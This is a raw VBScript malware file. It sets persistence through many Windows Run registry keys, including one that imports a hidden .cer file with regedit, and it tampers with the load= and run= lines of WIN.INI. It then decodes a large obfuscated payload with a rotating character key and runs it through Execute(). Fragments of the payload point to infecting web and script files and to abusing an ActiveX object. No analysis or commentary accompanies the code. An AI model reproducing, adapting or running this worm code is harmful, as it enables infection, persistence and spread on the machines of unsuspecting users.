Set CURObj = CreateObject("WScript.Shell")
mhk="HK"&"LM\SOFT"&"WARE\Micr"&"osoft\Win"&"dows\Curren"&"tVersion\Run\"
mhc="HK"&"CU\Soft"&"ware\Micros"&"oft\Win"&"dows\Curren"&"tVersion\Run\"
mhk2="HK"&"LM\SOFT"&"WARE\Micr"&"osoft\Win"&"dows\Curren"&"tVersion\"
CURObj.RegWrite ""&mhk&"W1N32","regedit -s c:\windows\system32\$WIN32$\WIN32SQL.cer"
CURObj.RegWrite ""&mhk&"internat.exe","internat.exe"
CURObj.RegWrite ""&mhk&"zwupdows","12"
CURObj.RegWrite ""&mhk&"win","12"
CURObj.RegWrite ""&mhk&"mwin","12"
CURObj.RegWrite ""&mhk&"internt","12"
CURObj.RegWrite ""&mhk&"Inernet","12"
CURObj.RegWrite ""&mhk&"Internet","12"
CURObj.RegWrite ""&mhk&"iexpleror","12"
CURObj.RegWrite ""&mhk&"zxdows","12"
CURObj.RegWrite ""&mhk&"qwe","12"
CURObj.RegWrite ""&mhk&"win1","12"
CURObj.RegWrite ""&mhk&"intelnat.exe","12"
CURObj.RegWrite ""&mhk&"u1888","12"
CURObj.RegWrite ""&mhk&"intenet","12"
CURObj.RegWrite ""&mhk&"9i5zxdows","12"
CURObj.RegWrite ""&mhk&"9i5com01zxdows","12"
CURObj.RegWrite ""&mhk&"99zxdows","12"
CURObj.RegWrite ""&mhk&"88zxdows","12"
CURObj.RegWrite ""&mhk&"Start Pagewin","12"
CURObj.RegWrite ""&mhk&"Start Page","12"
CURObj.RegWrite ""&mhk&"u188","12"
CURObj.RegWrite ""&mhk&"9i5comzxdows","12"
CURObj.RegWrite ""&mhk&"9q5zxdows","12"
CURObj.RegWrite ""&mhk&"u1881","12"
CURObj.RegWrite ""&mhk&"u1882","12"
CURObj.RegWrite ""&mhk&"u1883","12"
CURObj.RegWrite ""&mhk&"u1884","12"
CURObj.RegWrite ""&mhk&"u1885","12"
CURObj.RegWrite ""&mhk&"u1886","12"
CURObj.RegWrite ""&mhk&"u1887","12"
CURObj.RegWrite ""&mhk&"u88y", "12"
CURObj.RegWrite ""&mhk&"flash", "12"
CURObj.RegWrite ""&mhk&"999izxdows","12"
CURObj.RegWrite ""&mhk&"033zxdows","12"
CURObj.RegWrite ""&mhk&"syste","12"
CURObj.RegWrite ""&mhc&"my","12"
CURObj.RegWrite ""&mhk&"3zxdows","12"
CURObj.RegWrite ""&mhk&"88u88","12"
CURObj.RegWrite ""&mhk&"system","12"
CURObj.RegWrite ""&mhk&"8zxdows","12"
CURObj.RegWrite ""&mhk&"u18","12"
CURObj.RegWrite ""&mhk&"interneet.exe","12"
CURObj.RegWrite ""&mhk2&"RunOnce\", "12"
CURObj.RegWrite ""&mhk&"iexpler", "12"
CURObj.RegWrite ""&mhk&"u1810", "12"
CURObj.RegWrite ""&mhk&"winwin", "12"
CURObj.RegWrite ""&mhk&"WIN32", "12"
CURObj.RegDelete ""&mhc&""
CURObj.RegDelete ""&mhk&"zwupdows"
CURObj.RegDelete ""&mhk&"win"
CURObj.RegDelete ""&mhk&"mwin"
CURObj.RegDelete ""&mhk&"internt"
CURObj.RegDelete ""&mhk&"inernet"
CURObj.RegDelete ""&mhk&"Internet"
CURObj.RegDelete ""&mhk&"u188"
CURObj.RegDelete ""&mhk&"iexpleror"
CURObj.RegDelete ""&mhk&"zxdows"
CURObj.RegDelete ""&mhk&"qwe"
CURObj.RegDelete ""&mhk&"win1"
CURObj.RegDelete ""&mhk&"intelnat.exe"
CURObj.RegDelete ""&mhk&"intenet"
CURObj.RegDelete ""&mhk&"9i5zxdows"
CURObj.RegDelete ""&mhk&"9i5com01zxdows"
CURObj.RegDelete ""&mhk&"99zxdows"
CURObj.RegDelete ""&mhk&"88zxdows"
CURObj.RegDelete ""&mhk&"Start Pagewin"
CURObj.RegDelete ""&mhk&"Start Page"
CURObj.RegDelete ""&mhk&"9i5comzxdows"
CURObj.RegDelete ""&mhk&"9q5zxdows"
CURObj.RegDelete ""&mhk&"999izxdows"
CURObj.RegDelete ""&mhk&"033zxdows"
CURObj.RegDelete ""&mhk&"u1881"
CURObj.RegDelete ""&mhk&"u1882"
CURObj.RegDelete ""&mhk&"u1883"
CURObj.RegDelete ""&mhk&"u1884"
CURObj.RegDelete ""&mhk&"u1885"
CURObj.RegDelete ""&mhk&"u1886"
CURObj.RegDelete ""&mhk&"u1887"
CURObj.RegDelete ""&mhk&"u88y"
CURObj.RegDelete ""&mhk&"flash"
CURObj.RegDelete ""&mhk&"88u88"
CURObj.RegDelete ""&mhk&"interneet.exe"
CURObj.RegDelete ""&mhk&"u18"
CURObj.RegDelete ""&mhk&"u1888"
CURObj.RegDelete ""&mhk&"system"
CURObj.RegDelete ""&mhk&"3zxdows"
CURObj.RegDelete ""&mhk&"8zxdows"
CURObj.RegDelete ""&mhk&"syste"
CURObj.RegDelete ""&mhk2&"RunOnce\"
CURObj.RegDelete ""&mhk&"iexpler"
CURObj.RegDelete ""&mhk&"u1810"
CURObj.RegDelete ""&mhk&"winwin"
CURObj.RegDelete ""&mhk&"WIN32"

Set FSO = CreateObject("Scripting.FileSystemObject")
myfile14=FSO.FileExists("c:\windows\WIN.INI")
if myfile14 then
set FSO2=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin=FSO2.ReadALL()
l=Instr(mywin,"run=")-3
m=Instr(mywin,"load=")-1
n=Instr(mywin,"NullPort=")-3
FSO2.close
if l>0 and m>0 and l>m then
set FSO3=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin2=FSO3.Read(l)
FSO3.close
set FSO4=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin3=FSO4.Read(m)
FSO4.close
if n>0 and n>l then
set FSO5=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin4=FSO5.Read(n)
FSO5.close
mywin=Replace(mywin,mywin4,"")
set FSO2=FSO.CreateTextFile("c:\windows\WIN.INI")
FSO2.Write mywin3
FSO2.WriteLine "load="
FSO2.Write "run="
FSO2.Write mywin
FSO2.close
else
mywin=Replace(mywin,mywin2,"")
set FSO2=FSO.CreateTextFile("c:\windows\WIN.INI")
FSO2.Write mywin3
FSO2.Write "load="
FSO2.Write mywin
FSO2.close
end if
end if
end if

ExeString = "<cjAhTa]lb%@njeL_um$P_lL_um$>b`j_bLaak%9jme]I_c]]q%>ML%OmPa]fi%OckIYne%Ko_>$@fgYfv=amhMr[EGXkn^kl&EGL]nAbe&EG<j_^m]Gfea_r!!DBFfd]Cq!!DB=o^YnbFYci!!DBJohh[dZl_%Bg\PnZ@rg[nfhfHC9jm^f^Qh @fe]J^m`&Qrh_Pmj#Gh>jllkLblmgbF_umP^lO^Y^Q^ej6@PH&Im^fNbql@fe]Cbd_MZlb)*!MejPmj:J_^]L_ji&LbZ\;ieF_Cklll%MejPmj&DBYpmYlq!!&48)IoD_k!LgmLll&4.LbbgO^Y^Q^ej+<dip^Bqan?mh`maik?k]CcCcLsm^Kno5alnLbbgO^Y^Q^ej+<dip^P^lCbd_Q^ej6@PH&Im^fNbql@fe]Cbd_MZlb)+!?afbM]gm'Olfm]5#<L=Qlgdi^]5 n\p\jcmm2HCWmqZjn%7#n\@kD`NjiKnos[;lI_ AlgiM]rq@fe]Nbfh(@egmbMbm@>mllf[7?KI+@]nCbd_%?afbIYneC:lnobZ(^mllf[mnbl7,,>dmbLbZ\Nbfh(@egmbMbm@fe]Nbfh:>ML'GjbgL_um>ci^ @fe]J^m`&5F_Nvi]Mqk7`njeQa]h>ci^L_ji&Qobl_oZ=oE^#6ALGI7#n\@kD`9 :IARikeg[a6oZm`kajq3#EGXkn^kl&; oZ=oE^#@njeL_umBek_F_Nvi]Mqk7n\pNe^f?afbM]gm'Olfm]s[;lI_ OZmQ^pn=haA`>ci^L_ji&=ihk_=haA`=ha>ok\lclg>ok\lclgEG<`[k`]Mr[ =rkj_kmKnobfa)EYmqBf^bq;b^k!B^IZknFg\_u<`[o5-LbbgF_Fb_lI<Ymb!;ook]hqLllfg_#)*!:5F@Zk_%[&LbbgHC;b^g__PnZ:>ckZdsAbke7ULm\B5-?il]DB=eZfabLm\6=ek ;p\ Fb_lI<Ymb!;ook]hqLllfg_#)*!#&+&3TKo_>7)Bg\F_Bek_CD@aYhd^Ko_5Jb\@njlbglMqkahd%)&IZknFg\_u<`[oBg\F_Bg\Cnf]qbghCnf]qbghDB=o^YnbFYci!!HfBkjioJ_pne_G]rqCcAhTa]lb5algiNe^f>pcq>ok\lclgBg\F_PaYlb?afb5I^^n%PahMZlb),!#Joh_l^f@fe]mY<ggjhfCbd_pUEc`kgml_lPaYlb]TMqZlclg]lvUZf^gc(emeA`!>ML'>ci^=rfllm%L`[o^>ci^!#M`_k=^edHC9jm^f^Qh MeZj_Cbd_)`nje#=fp^P^lCbd_Q^ej6@PH&Im^fNbql@fe]PaYlb?afb%*&qkm_&@fe]Nbfh(Tkanb6ALGI7#n\@kD`9 :IARikeg[a6oZm`kajq3#EGXkn^kl&; oZ=oE^#@njeL_umCbd_Q^ej+<dip^Bg\F_A^^[relCa5TlKbbed(O^_LbZ\AC?VX;OOK=HQXMMBKTCa^fnfma_pU<_cZmfqMmbkCA!HmnIhgeS^jmfhf:OmPa]fi'J_dK][a!BH>QYIH;;IXE;@AAHBUKicmo[o^TGf\jiph^nYHmnihge>pjo^kmYF]^fZN_o!PkMe^df+K]aTkanbBH>QY@NJLBGLYRL=LYB\_kmanf^kV<_cZmfqB\ UKicmo[o^TGf\jiph^nYHmnihge>pjo^kmYI^^n%HmnIhgeS^jmfhf&. '(VJZafY<ggmhk_Nk_Ll[qbghbkq)*$O>?YAPGLA@ZdfDBG^bdLb` ED=S\<MLO>FN\NK?OUA^bglcqb]mY>b_YoimA^#TMl_lq^k]VJb[lllg`qUGoqegih=rmk]mpU E]`q!GoqEgihO]lpbgh)*!#&*YFYciUKn^maik^jsGYgb$MeZj_Cbd_&=^edHCE[feJ_d!BH>QY@NJLBGLYRL=LYB\_kmanf^kV<_cZmfqB\ UKicmo[o^TGf\jiph^nYHmnihge>pjo^kmYI^^n%HmnIhgeS^jmfhf&. '(VJZafYPa^bKn^maik^jsGYgb$MeZj_Cbd_&QpL`_ie&Lb`Olfm]AC?VX;OOK=HQXMMBKTMl_lq^k]VJb[lllg`qUG`cb[_Y2&*YHmnihgeYHhnfhfmYFYciU=^fmglMk]`bk]h`^&.,)*4+$O>?YAPGLA@ZdfDBG^bdLb` ED=S\<MLO>FN\NK?OUKicmo[o^TGf\jiph^nYPahahomF]mpZ_ck`Mr[kspm]gYIjicbd_pUEc`kgml_lLnlflhcFgl_og]nL]nqbfapU([-](,-)(*-)(*-)[*-)(*-)(*-)(*1/T*-*]*0/()Zf^gc&=^edHCE[feJ_d!BH>QY@NJLBGLYRL=LYLg`qpYlbUEc`kgml_lVTbf^lpkKMT=rkj_kmN_olaikUOck]gqpE_plYafg_PnZmvll_jUHll_afblTGf\jiph^nHmnihgeBfnbkf_qK_qmahdlT*^)\*/)(*-)(*-)(]-)(*-)(*-)(*--.V-))_-,.*%\iZfeTlKbbed(O^_Qobl_@EBRW=RKJ?KMWOP>JVPh^ntZj_YFa]ohkicmTIc_a]bU)*+)TIrmdildTImmaiklTG^bdVB]anlkHlb_]lbg[_%)-.)/,)J?DX<QLK<;[ieEGFYciK]a%@EBRW=RKJ?KMWOP>JVPh^ntZj_YFa]ohkicmTIc_a]bU)*+)T=lfeikUE[feK_qmahdlTHbpKn^maik^js%\iZfeHCmgjZ__Chd^bk Fb_lTbfJ^m`&0 Hll`j[j>ci^kV@heglg@fe]mYFa]ohkicmMeZj_aUKn^maik^jsBg\Cnf]qbghCnf]qbghDB=o^YnbFaff^m&Ik=lohjO^koj^HbqlM]gmIYne5F_Hlm @PH&@fe]?ubknp!OckIYnePK]obhn+^p_!Qa]hL_jiH[qa7kspm]g0+T=haA`A`M]gmIYne5lqmq^e-/UQa]hKn^klOm?afb5TbfJ^m`#MVLL?JUC_og]f0+&^ie>dmbMqZjnRi>ci^7PahMZlbPRKNBFTEbkf_i'\fiBg\F_TlKbbed(O^_Qobl_@EBRWFL<9F\F9=EBF?YLg`qpYlbUEc`kgml_lVTbf^lpkV@njlbglPbkkclgTLrgTEbkf_i,*)Ll[omMjCbd_>ML';imr>ci^QfgH[qa o__UcdtZdf+`a`%OckIYnep]\Y?gfa^j(eml>ML';imr>ci^QfgH[qa kspm]g0+TegpYfi'_cc$QfgH[qa kspm]g0+T^blcnli&ckb<YfiCD>ih_k]Li%PahMZlbt^ZVChd^bk&bqm&alnTlKbbed(O^_Qobl_@EBRW=I:KMBLWLLHLV+]dfY$aed`fe]OmPa]fi'J_dPjcq^ED=S\<D;PL=M\KGIQU&^ieT=lgl_kmNvi])Yjmea]^maik(p'jl\itgdi^]PkMe^df+K]aTkanbBH>QY@E9MP>KYOHGNY]dfcbd_Y=]`^ndnF\ghY$QpL`_ie&Lb`J_^] ED=S\<D;PL=M\KGIQUnra_afbU<_cZmfqB[ikU#OmPa]fi'J_dPjcq^ED=S\<D;PL=M\KGIQU\fi_afbUK]obhnBg_ck^T)N<P\jcmmPkMe^df+K]aTkanbBH>QY@E9MP>KYOHGNY]dfCbd_YL`_ieTIm^fV@heg^g\V%OckIYneQ^ejMZlbTL[lfil(bq]+'TlKbbed(O^_Qobl_@EBRW=I:KMBLWLLHLVaed@fe]VPa]fi>pVMkgjbklsPa]_qAYhae]lpUOMEIjimlT)s0-+-.@:-'6.+<**)=C&0=6/%*-:9*-;01-1;wQpL`_ie&Lb`Olfm]AC?VX;F>LK?PXJILMT^ie>ci^TM`kajqAgmq>f]l]]V%u5.)-./++*-0*@&)+A+%<.?1'-);*1?00@,*.zP^lCbd_Q^ej6@PH&Im^fNbql@fe]PmYlqNh@fe]&/%llr^!?afbM]gm'Olfm]S[kNbql?afbM]gm';fll]>f^?mh`maik?mh`maikCDIbc_Fm #A`BfQe^j_56algiNe^f>pcq>ok\lclgBg\F_QaamIh[[qbgh6^l\mgbgl(ih[[qbghA`E]`q!LbflDi`Zlclg$17^ci^Qa]hLbflDi`Zlclg7Fa^%M`cpEg]^maik%1#A`?KI+@]nBql_klaikGYgb!LbflDi`Zlclg!97lbbgQaamIh[[qbgh6Fb_lQaamIh[[qbgh)E]h%M`cpEg]^maik'E]h%?KI+@]nCbd_KZe_%M`cpEg]^maik!#=haA`A`E]h%M`cpEg]^maik8,Ne^fM`cpEg]^maik5QaamIh[[qbghYBg\F_HCmgjZ__Chd^bk NebkFl\Ynfhf#=haA`=ha>ok\lclg>ok\lclgEGFYciK]a%K]aPmj&Cbd_KZe_&Ik=lohjO^koj^HbqlK]aQ^ejPmj:OmPa]fi'J_dK][a!J_dLll&CcJ_dM]gmLll6LbbgTlKbbed(O^_Qobl_K]aPmj&Cbd_KZe_=haA`=ha>ok\lclg>ok\lclgEGHZiPnZ@njlbglMqkahdPnZ?6*L_pmGoq5->lObfe]Qkm_L_pmGoq5Q^knLnl()B^Q^knLnl;*2M`_k=rkj_kmKnobfa6@fgYfv=amh3T=rfm>l?k]CcIk=lohjO^koj^HbqlL]nM`cp?gfa^j:>ML'?_q?gfa^j@njlbglMqkahdP^lAb[Mr[7<j_^m]I_c]]q!M`kajqbfa+=a]qbgh^kq&Mbm@le\_ol7M`cp?gfa^j(PnZ@le\_olChd^bk;irgl:(?gl>Y]eL_ji>ii]]lbfChd^bkk?gfa^j=lnfn6@le\_o<gokm%*Ab[Mr[&[a]@le\_o<gokm$Q^ejChd^bk&H^f]G]rqCc<c`Lm\+<gokm7)Ne^fEYmqBf^bq;b^k7BfmqkJ_s!;ook]hqLllfg_&U&I^f@njlbglMqkahd%+&Mr[Knobfa6Gf] =rkj_kmKnobfa)EYmqBf^bq;b^k#+)E]h%<mlo^fnPmjck`!'IZknFg\_u<`[o&)#;ook]hqLllfg_:CD@aYhd^Ko_!;ook]hqLllfg_&IZknFg\_u<`[oPnZ?6+=fp^F_Mr[=:(Qa]h;ook]hqLllfg_:;ook]hqLllfg_#<c`Lm\+Bl_j!)#YBqan=g>dmbd6*>iob:)Qh@le\_o<gokmF_F@Zk_%Lm\Pmjck`!:D=^l]Ab[Mr[&Cq^eg!Qa]hA`c6?gfa^j=lnfnM`_k=rkj_kmKnobfa6=rkj_kmKnobfa>f\Ko_'Anbf d(*!#V?ublAhBg\F_Bg\F_K^pnD[pmAha^p=eZj:AhpmjLbo =rkj_kmKnobfa)T)E]h%<mlo^fnPmjck`!'.PnZMqkahd5Jb\@njlbglMqkahd%D[pmAha^p=eZj%.%D_k!;ook]hqLllfg_#*EYmqBf^bq;b^k%+&=rkj_kmKnobfa6EG<`[k`]Mr[ =rkj_kmKnobfa)EYmqBf^bq;b^k!>f^B^>f^B^EgimEGHZiPnZ:;ook]hqLllfg_>f^?mh`maik?mh`maikCDMkgj^`Ynb!!HfBkjioJ_pne_G]rqLb`H[qaN[in]:BH>QYIH;;IXE;@AAHBUKicmo[o^TGf\jiph^nYHmnihge>pjo^kmY=]ao^]<cpd<_dk]_6QpL`_ie&Lb`J_^] Lb`H[qaN[in]#A`=amh=]ao^]:M`_k>flc>b`j_b5Cbf[ir<cpd 2V?k]Cc@lkc:*nl-=amh=]ao^]:CDL[gMr[ >flc>b`j_bHCmgjZ__Chd^bk >flc>b`j_bK^pnOmPa]fi'J_dPjcq^Lb`H[qaN[in]&AbkeA^_lb^Bg\Cnf]qbghCnf]qbghDBojfYab?gfa^jMZlbKZe_&Ik=lohjO^koj^HbqlL]n?gfa^jH^f]:>ML'?_q?gfa^jMZlbKZe_&MbmNebk@fe]m6@le\_oGYgb'>ci^kAlnBqamql7)ChjBZ[bM`cp?afbAhM`cp?afblCbd_Bql:M=^l]CLG(D^l?um]hpbghKZe_%M`cp?afb'H[qa!#A`?afb>pn6EMEHjCbd_Bql:BQFDHjCbd_Bql:;PILk@fe]?um7HBMIo>ci^=rq5CKJLbbg@ZdfDB;mi]haMgQaamCbd_+IYne%bqfd&?il]Cc>ci^=rq5O:MLbbg@ZdfDB;mi]haMgQaamCbd_+IYne%p_l#=fp^A`?afb>pn6EMLM`_kBqm=rfllm6+=haA`F_umF_R<Ymb!H[qaF[j^!:M=^l]TbfJ^m`#>blcnliT&Io O@Zk_%IYneGYgb7N;[p^ QfgH[qa <_pdlim!#Qa]h@nq>pcpmk:)>f^B^B^Eml?ubknp5-LbbgCLG(@hhsCbd_PahMZlbprknbf+,Y]]mhmgj+bfc%H[qaF[j^CLG(@hhsCbd_PahMZlbt^ZVChd^bk&bqm&MZlbKZe_=haA`=ha>ok\lclg>ok\lclgEGL]nAbe&Ik=lohjO^koj^Hbql>jl+<d_^kQ^knFm7PK]obhn+L[lfil@redh^f]B^BkjQa]hAhTa]lb5algiBek_AhTa]lb5oZm?k]CcCcAhTa]lb5oZmLbbgP^lCLG:;lbZl_L[b_`m P\jcmmahd'>ci^Kspm]gL[b_`m#K_qOmPa]fi5@k][q^G\g^[n%OM`kajq'Kbbed&?il]L]n:hji^G\g^[n6^l\mgbgl(^ihfbmkDBYdn]mq!:hji^G\g^[n+l]n@EKCA!uC2+/A<*,**;@-&)+A)%;A;1'-);*1?</5:(<z!:hji^G\g^[n+\j_^m]Ckll[k\]&MbmQpL`_ie7:hji^G\g^[n+@]nL[b_`m #9jme]I_c]]q'k_q<DMF= x)<.0?=*.&>*6,%+.<>'52,**)(;-<1*2-*,5v#9jme]I_c]]q'[lbZl_Fgkn^g[_%P^lCLG:9jme]I_c]]q'?_qHZdb\l&?k]CcMbm>flcI_c]]q5CLG(AkapblChjBZ[b=amhM]gmAh=amhHZdb\lB^AbkeQ^ej+=jcs^Lsm^6;*>g\AbkeQ^ej+=jcs^Lsm^6;)Qa]h=rfm@lkBg\F_Cbf[ir<cpd7=amhM]gm'<lfo]Fbml_oHbql=agHlbbk9lo!+#J[k]ggfs]?glb5*Mg0Iqa]l>kjf7Bfn%!1'Jha!G]rqNbfhMqkahd5Chjf6)QhFbg NebkNbql#L_jiFoj5>l[Jb\QaamQ^pn)b$+&F_NbfhHrf7*+Qa]hL_jiFoj5/1Bek_F_NbfhHrf7*(Qa]hL_jiFoj5/2Bg\F_Q^ej@aYl6=ek NbfhHrf'Hlbbk9lo!aJh\1!B^Q^ej@aYl6=ek -1Ne^fM]gm<`[o5@aj.1!>f^B^M]gmLllfg_:L_jiKnobfaNbfh=eZjG]rqOkEg]hLll6Bq]]rm]<cjC_v:jl%,!&QaamQ^pnp_<jFcH^q;ok *&5Lm`_o:jl%)!#n\@kD`#Ebr9lo!)#6Iqa]l>kj. #oZ=oE^ C_v:jl%+!:#Gne^j;ok ,& s[;lI_D]s>kj07 Hlbbk9lo!+#p_<jFcChjf6)QhFbg ?u^Knobfa& s[;lI_M]gmGmg6;p\ Gf] ?u^Knobfa)b$+&#oZ=oE^ A`M]gmGmg6+5Lbbg#oZ=oE^ L_jiFoj50-#oZ=oE^ =haA`p_<jFcQ^ej@aYl6=ek NbfhHrf%D]s>kjfEia,#& s[;lI_B^Q^ej@aYl6=ek ,5Ne^fn\@kD`#Nbfh=eZj:n\@k#oZ=oE^ =fp^A`M]gm<`[o5@aj/2!Qa]hp_<jFcQ^ej@aYl6p_E^n\@kD`#?k]Cc s[;lI_M`cpM]rq5QaamQ^pnNbfh=eZjn\@kD`#Hbql#n\@kD`Bq]]rm]QaamQ^pn&QaamQ^pn6Bq]Mqkahd5#L_jiKnobfaAlgiM]rq59 k]obhneYhdnYab6n\p\jcmm6p_<jFc]g]rf]hq'olfm]9 \csknve]7$igmfmaik3Y\phdoq^3i^^n7)hr8lim3(ju4qf]lb7)hr8`_f``n7)hr8r'fg\_u3*28ncpbZcibls7`ca]]h$7#6 9JME=NG9GB6CDX_obllE>AAEM5*PA>QA5*\g^b6[ij'em+ Y]qbn_U'9]qbn_Q;ijighbgl85#)>IHFBM69 '^fo6 oZ=oE^#6(k]obhn; oZ=oE^#6l[lfiliZfarZ__:oZm`kajq7#n\@kD`NebkNbql#n\@kD`OkEg]hLllp_<jFc5#)p\jcmm6p_<jFc5#)?H<S; oZ=oE^#6(@NJE6N\pM]rq5QaamQ^pnp_<jFcRgDi`dKnos[;lI_ CD\ll[om #QfgH[qa7?KI+@]nPi]]fZd@le\_o!(#YF_CLG(Cbd_Bqamql QfgH[qa o__U>ii]]l+aln!Qa]h>ML';imr>ci^QfgH[qa o__U>ii]]l+aln%OckIYnep]\Ydbq^ed(db^=haA`A`!>ML'>ci^=rfllm%PahMZlbprknbf+,Y]]mhmgj+bfc!Qa]h>ML';imr>ci^QfgH[qa kspm]g0+T^blcnli&ckb&TbfJ^m`#mvll_j,*Vhco[ie&af_>f^B^>f^?mh`maik"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 7"&vbCrLf&"KeyArr(1) = 8"&vbCrLf&"KeyArr(2) = 6"&vbCrLf&"KeyArr(3) = 3"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
KJ_start()